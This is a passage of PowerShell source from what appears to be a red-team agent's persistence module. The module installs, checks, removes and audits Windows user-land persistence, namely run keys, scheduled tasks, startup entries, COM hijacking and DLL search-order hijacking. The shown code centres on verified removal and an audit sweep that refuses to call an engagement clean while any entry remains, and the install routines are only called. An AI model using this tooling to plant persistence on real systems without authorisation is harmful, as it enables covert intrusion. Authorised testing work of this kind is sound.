      $ev.note = 'the journaled pre-install value was restored and re-verified - the location provably holds what it held before install'
      $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o')
      return $ev
    }
    $cur = Probe-VvPersistTech $loc
    if ($cur.Present) {
      $canon = $(if ($Target) { ConvertTo-VvCanonicalTarget $Target } else { $null })
      $claimed = ($null -ne $entry) -or ($canon -and (ConvertTo-VvCanonicalTarget ([string]$cur.Value)) -eq $canon)
      if (-not $claimed) {
        $ev.state = 'refused-foreign'
        $ev.note = 'the location holds a value this agent NEVER installed (no manifest entry, value mismatch) - REFUSED to remove what we did not write'
        return $ev
      }
      Clear-VvPersistTech $loc
      $post = Probe-VvPersistTech $loc
      $ev.removalVerified = (-not $post.Present)
      if (-not $ev.removalVerified) {
        $ev.state = 'removal-failed'
        if ($entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
        $ev.error = 'remove executed but the location is STILL PRESENT on re-read - CLEANUP-PROOF FAILED (loud, escalated to the operator; the engagement cannot be called clean)'
        return $ev
      }
      $ev.state = 'removed'
      if ($entry) { $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o') }
      else { $ev.note = 'no manifest entry (value-identified as ours) - removed and verified absent' }
      return $ev
    }
    $ev.state = 'removed'; $ev.removalVerified = $true
    $ev.note = $(if ($entry) { 'already absent at remove time - absence re-verified now' } else { 'nothing installed (no manifest entry) - the location is verified clean' })
    if ($entry) { $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o') }
    return $ev
  } catch {
    $ev.state = 'removal-failed'
    if ($entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
    $ev.error = [string]$_.Exception.Message + ' - removal UNVERIFIED (LOUD; escalate)'
    return $ev
  }
}

# The engagement sweep: every manifest entry re-probed LIVE (measured now, never
# remembered). clean === true ONLY with zero open entries - an engagement with
# unverified persistence is never clean.
function Invoke-VvPersistAudit($Manifest) {
  $entries = @()
  $open = @()
  foreach ($tech in @($Manifest.entries.Keys)) {
    $entry = $Manifest.entries[$tech]
    # Sweep rows report the BASE technique ('comhijack', not the per-CLSID manifest key
    # 'comhijack-9B1F4D2E') so engagement tracking keys consistently on
    # technique+location; the key handle rides as 'key' for deep entries. (Twin:
    # PersistStore.audit in engine/persist.mjs.)
    $rec = [ordered]@{ technique = $(if ($null -ne $entry.deep) { [string]$entry.technique } else { $tech }); location = [string]$entry.location; targetSha256 = [string]$entry.targetSha256; state = [string]$entry.state; removalVerified = ($entry.removalVerified -eq $true); installedAt = $entry.installedAt; removedAt = $entry.removedAt; note = $null }
    if ($null -ne $entry.deep) { $rec['key'] = $tech }
    if ($entry.state -eq 'removed' -and $entry.removalVerified -eq $true) { $entries += $rec; continue }
    if ($null -ne $entry.deep) {
      # DEEP sweep: re-probe the entry's recorded artifact set LIVE (the hijacked value;
      # the trigger + every planted file).
      $sweep = Probe-VvDeepEntryPresence $entry ([string]$Manifest.tag)
      $rec.state = $sweep.State; $rec.removalVerified = $sweep.Verified; $rec.note = $sweep.Note
      if ($sweep.Verified) {
        $entry.state = 'removed'; $entry.removalVerified = $true
        if (-not $entry.removedAt) { $entry.removedAt = [DateTime]::UtcNow.ToString('o') }
      } else { $open += $rec }
      $entries += $rec
      continue
    }
    $cur = $null
    try { $cur = Probe-VvPersistTech (Get-VvPersistLoc $tech ([string]$Manifest.tag)) } catch { $cur = $null }
    if ($null -ne $cur -and $cur.Present) {
      $isOurs = (-not $Manifest.target) -or ((ConvertTo-VvCanonicalTarget ([string]$cur.Value)) -eq (ConvertTo-VvCanonicalTarget ([string]$Manifest.target)))
      $rec.state = $(if ($entry.state -eq 'removal-failed') { 'removal-failed' } elseif ($isOurs) { 'installed' } else { 'tampered' })
      $rec.removalVerified = $false
      $rec.note = 'STILL PRESENT at the sweep - unverified persistence; the engagement is NOT clean'
      $open += $rec; $entries += $rec
    } elseif ($null -ne $cur -and -not $cur.Present) {
      $rec.state = 'absent'; $rec.removalVerified = $true
      $rec.note = 'live-verified absent at sweep (measured now, not remembered)'
      $entry.state = 'removed'; $entry.removalVerified = $true
      if (-not $entry.removedAt) { $entry.removedAt = [DateTime]::UtcNow.ToString('o') }
      $entries += $rec
    } else {
      $rec.state = $(if ($entry.state -eq 'removal-failed') { 'removal-failed' } else { 'unknown' })
      $rec.removalVerified = $false
      $rec.note = 'sweep probe failed - removal UNVERIFIED (treated as open: never assume absence)'
      $open += $rec; $entries += $rec
    }
  }
  $clean = ($open.Count -eq 0)
  $note = $(if ($clean) {
    if ($entries.Count -eq 0) { 'no persistence was ever installed by this agent (empty manifest) - clean' }
    else { 'every installed persistence is verified removed - the engagement persistence footprint is clean' }
  } else {
    ([string]$open.Count + ' technique(s) still present or removal-unverified - the engagement CANNOT be called clean; run persist-remove and re-audit')
  })
  return @{ clean = $clean; entries = $entries; open = $open; note = $note }
}

# Expand one named target into dispatch rows @{ key; tech; deep }: classic techniques
# map to one row keyed by name; a deep technique with explicit params maps to its
# per-CLSID/per-handle entry key; without params it expands to every recorded manifest
# entry of the technique (or the honest nothing-recorded row); a manifest entry KEY
# ('comhijack-<clsid8>') resolves through its recorded params.
function Expand-VvPersistTarget([string]$TargetName, $Deep, $Manifest, [string[]]$KnownClassic, [string[]]$KnownDeep) {
  if ($KnownClassic -contains $TargetName) { return @(@{ key = $TargetName; tech = $TargetName; deep = $null }) }
  if ($KnownDeep -contains $TargetName) {
    if ($null -ne $Deep) { return @(@{ key = (Get-VvDeepEntryKey $TargetName $Deep); tech = $TargetName; deep = $Deep }) }
    $rows = @()
    foreach ($k in @($Manifest.entries.Keys)) {
      $e = $Manifest.entries[$k]
      if ($e.technique -eq $TargetName -and $null -ne $e.deep) { $rows += @{ key = $k; tech = $TargetName; deep = $e.deep } }
    }
    if ($rows.Count -eq 0) { $rows = @(@{ key = $TargetName; tech = $TargetName; deep = $null }) }
    return $rows
  }
  $e = $Manifest.entries[$TargetName]
  if ($null -ne $e) {
    if ($null -ne $e.deep) { return @(@{ key = $TargetName; tech = [string]$e.technique; deep = $e.deep }) }
    if ($KnownClassic -contains ([string]$e.technique)) { return @(@{ key = $TargetName; tech = [string]$e.technique; deep = $null }) }
  }
  throw "unknown persist technique: $TargetName (the tier ships runkey, schtask, startup + deep comhijack, dllsearch - Windows user-land; no kernel, no SYSTEM services, no WMI subscriptions, no HKLM hives)"
}

# Dispatch one op into a result JSON string. $Op: install | status | remove | audit.
# $Deep: the deep-technique params (clsid+dll / host+as+dll+trigger). $Prove: run the
# benign resolve-proof on installed comhijack rows (status only).
function Invoke-VvPersistOp([string]$Op, [string[]]$Techniques, [string]$Name, [string]$Target, [bool]$Overwrite, [bool]$All, [string]$ManifestPath, $Deep = $null, [bool]$Prove = $false) {
  $knownClassic = @('runkey', 'schtask', 'startup')
  $knownDeep = @('comhijack', 'dllsearch')
  $known = $knownClassic + $knownDeep
  $manifest = Read-VvPersistManifest $ManifestPath $Name $Target
  # target resolution: the job's freshly captured line wins; the MANIFEST's recorded
  # line is the fallback (a relaunched agent may not rebuild the identical line - the
  # manifest is the source of truth for what was installed).
  if ((-not $Target -or $Target.Trim().Length -eq 0) -and $manifest.target) { $Target = [string]$manifest.target }
  # name resolution: explicit job name > manifest tag > target-derived tag
  if (-not $Name -or $Name.Trim().Length -eq 0) {
    if ($manifest.tag) { $Name = [string]$manifest.tag }
    elseif ($Target) { $Name = Get-VvPersistTag $Target }
    else { $Name = $null }
  }
  if ($Name -and -not (Test-VvPersistName $Name)) { throw "persist: name '$Name' is not a safe persistence handle (want ^[A-Za-z0-9][A-Za-z0-9_.-]{0,39}`$)" }
  if ($Name) { $manifest.tag = $Name }
  if ($Target) { $manifest.target = $Target; $manifest.targetSha256 = Get-VvPersistSha256Hex $Target }

  if ($Op -eq 'audit') {
    $sweep = Invoke-VvPersistAudit $manifest
    [void](Write-VvPersistManifest $ManifestPath $manifest)
    $aresult = [ordered]@{ op = 'audit'; pid = $PID; state = $(if ($sweep.clean) { 'clean' } else { 'unclean' }); clean = $sweep.clean; entries = $sweep.entries; open = $sweep.open; note = $sweep.note; at = [DateTime]::UtcNow.ToString('o') }
    return ($aresult | ConvertTo-Json -Compress -Depth 8)
  }

  if (-not $Name) { throw "persist-${Op}: no name handle resolvable (pass one explicitly, or install once so the manifest carries it)" }
  $techMap = [ordered]@{}
  $targets = @()
  if ($Op -eq 'install') {
    if ($null -eq $Techniques -or $Techniques.Count -eq 0) { throw 'persist-install: techniques is empty - nothing to do' }
    foreach ($t in $Techniques) { if ($known -notcontains $t) { throw "unknown persist technique: $t (the tier ships runkey, schtask, startup + deep comhijack, dllsearch - Windows user-land)" } }
    $deepTechs = @($Techniques | Where-Object { $knownDeep -contains $_ })
    if ($deepTechs.Count -gt 0) {
      if ($Techniques.Count -gt 1) { throw 'persist-install: a deep technique (' + ($deepTechs -join ', ') + ') installs ALONE - one deliberate parameterized op per task; no mixing with classic techniques or a second deep technique' }
      Assert-VvDeepParams $deepTechs[0] $Deep
    } elseif ($null -ne $Deep) { throw 'persist-install: "deep" params require a deep technique (comhijack, dllsearch) in techniques' }
    if (-not $Target -or $Target.Trim().Length -eq 0) { throw 'persist-install: no relaunch target captured agent-side - persistence must relaunch the SAME agent with the SAME config; without a captured launch line there is nothing honest to install' }
    $targets = $Techniques
    foreach ($t in $targets) {
      if ($knownClassic -contains $t) { $techMap[$t] = Install-VvPersistTechOne $t $Name $Target $manifest $Overwrite }
      else {
        $key = Get-VvDeepEntryKey $t $Deep
        if ($t -eq 'comhijack') { $techMap[$key] = Install-VvDeepComHijack $key $Name $Deep $manifest $Overwrite }
        else { $techMap[$key] = Install-VvDeepDllSearch $key $Name $Deep $manifest $Overwrite $ManifestPath }
      }
    }
  } elseif ($Op -eq 'status') {
    if ($null -eq $Techniques -or $Techniques.Count -eq 0) {
      $targets = @($manifest.entries.Keys)
      foreach ($t in $knownClassic) { if ($targets -notcontains $t) { $targets += $t } }
    } else {
      foreach ($t in $Techniques) { if ($known -notcontains $t) { throw "unknown persist technique: $t" } }
      $targets = $Techniques
    }
    foreach ($t in $targets) {
      foreach ($row in (Expand-VvPersistTarget $t $Deep $manifest $knownClassic $knownDeep)) {
        if ($knownClassic -contains $row.tech) { $techMap[$row.key] = Get-VvPersistStatusOne $row.tech $Name $manifest $Target }
        else { $techMap[$row.key] = Get-VvDeepStatusOne $row.key $row.tech $Name $row.deep $manifest $Prove $ManifestPath }
      }
    }
  } elseif ($Op -eq 'remove') {
    if ($All) {
      $targets = @($manifest.entries.Keys)
      foreach ($t in $knownClassic) { if ($targets -notcontains $t) { $targets += $t } } # probe by name even without an entry (idempotent, verified-clean)
    } else {
      if ($null -eq $Techniques -or $Techniques.Count -eq 0) { throw 'persist-remove: techniques is empty - give techniques or all:true (removal is never ambiguous)' }
      foreach ($t in $Techniques) { if ($known -notcontains $t) { throw "unknown persist technique: $t" } }
      $targets = $Techniques
    }
    foreach ($t in $targets) {
      foreach ($row in (Expand-VvPersistTarget $t $Deep $manifest $knownClassic $knownDeep)) {
        if ($knownClassic -contains $row.tech) { $techMap[$row.key] = Remove-VvPersistTechOne $row.tech $Name $manifest $Target }
        else { $techMap[$row.key] = Remove-VvDeepTechOne $row.key $row.tech $Name $row.deep $manifest $ManifestPath }
      }
    }
  } else {
    throw "unknown persist op: $Op (want install | status | remove | audit)"
  }
  $manifestSaved = Write-VvPersistManifest $ManifestPath $manifest
  if (-not $manifestSaved -and $ManifestPath) {
    foreach ($k in $techMap.Keys) { $techMap[$k].note = ([string]$techMap[$k].note + ' MANIFEST WRITE FAILED - the on-disk removal record is degraded (locations are still deterministic by name; re-run persist-status to re-record)').Trim() }
  }
  # Aggregate state: 'failed' if ANY failed/removal-failed (a partial or unverified
  # result is never dressed up as a win); 'refused' if any governed refusal; else the
  # op's success state; status aggregates installed/absent/mixed from the per-technique truth.
  $states = @($techMap.Values | ForEach-Object { [string]$_.state })
  if (($states | Where-Object { $_ -eq 'failed' -or $_ -eq 'removal-failed' }).Count -gt 0) { $agg = 'failed' }
  elseif (($states | Where-Object { $_ -eq 'refused-clobber' -or $_ -eq 'refused-foreign' }).Count -gt 0) { $agg = 'refused' }
  elseif ($Op -eq 'install') { $agg = 'installed' }
  elseif ($Op -eq 'remove') { $agg = 'removed' }
  else {
    if (($states | Where-Object { $_ -eq 'installed' }).Count -eq $states.Count) { $agg = 'installed' }
    elseif (($states | Where-Object { $_ -eq 'absent' -or $_ -eq 'removed' }).Count -eq $states.Count) { $agg = 'absent' }
    else { $agg = 'mixed' }
  }
  $result = [ordered]@{ op = $Op; pid = $PID; state = $agg; techniques = $techMap; at = [DateTime]::UtcNow.ToString('o') }
  return ($result | ConvertTo-Json -Compress -Depth 8)
}

# ==PERSIST-LIB== end ------------------------------------------------------------------

# The REPL: one JSON job line in, one JSON result line out, until stdin closes. Unlike
# the evasion host, installed state SURVIVES this process by design (that is the point
# of the tier) - the on-disk removal manifest is what keeps that survivable state
# accountable across processes.
while ($true) {
  $line = [Console]::In.ReadLine()
  if ($null -eq $line) { break }
  $line = $line.Trim()
  if ($line.Length -eq 0) { continue }
  $out = ''
  try {
    $job = $line | ConvertFrom-Json
    $techs = @()
    if ($job.techniques) { $techs = @($job.techniques | ForEach-Object { ([string]$_).ToLower().Trim() } | Where-Object { $_.Length -gt 0 }) }
    $out = Invoke-VvPersistOp ([string]$job.op).ToLower() ([string[]]$techs) ([string]$job.name) ([string]$job.target) ($job.overwrite -eq $true) ($job.all -eq $true) ([string]$job.manifestPath) $job.deep ($job.prove -eq $true)
  } catch {
    $out = ([ordered]@{ op = 'error'; pid = $PID; state = 'failed'; techniques = @{}; error = [string]$_.Exception.Message; at = [DateTime]::UtcNow.ToString('o') } | ConvertTo-Json -Compress)
  }
  [Console]::Out.WriteLine($out)
  [Console]::Out.Flush()
}
